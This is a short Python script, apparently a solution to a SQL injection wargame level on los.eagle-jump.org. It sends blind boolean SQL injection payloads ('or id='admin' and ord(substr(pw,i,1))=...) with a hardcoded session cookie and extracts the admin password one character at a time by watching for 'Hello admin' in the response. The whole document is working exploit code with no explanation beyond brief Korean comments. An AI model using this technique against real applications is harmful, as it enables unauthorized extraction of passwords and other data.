import urllib.request
from urllib.parse import quote

key = ""
hexcode = "0x"

for i in range(1,41):
    for j in range(32, 1000):
        url = "http://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php?pw="#고정된 부분
        data = "' or id='admin' and ord(substr(pw, {}, 1))='{}'#".format(str(i), str(j))
        print(data)
        data = quote(data)

        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36")
        re.add_header("Cookie", "PHPSESSID=4csf3od9cfat47akhjak8okpi6")

        response = urllib.request.urlopen(re)

        if str(response.read()).find("Hello admin") != -1:
            key += chr(j) #찾은 문자를 추가함
            hexcode += hex(j)[2:] #0x를 잘라주기 위해 문자열을 슬라이스 했다.
            print('key : ' + key)
            print('hex : ' + hexcode)
            break
print(key)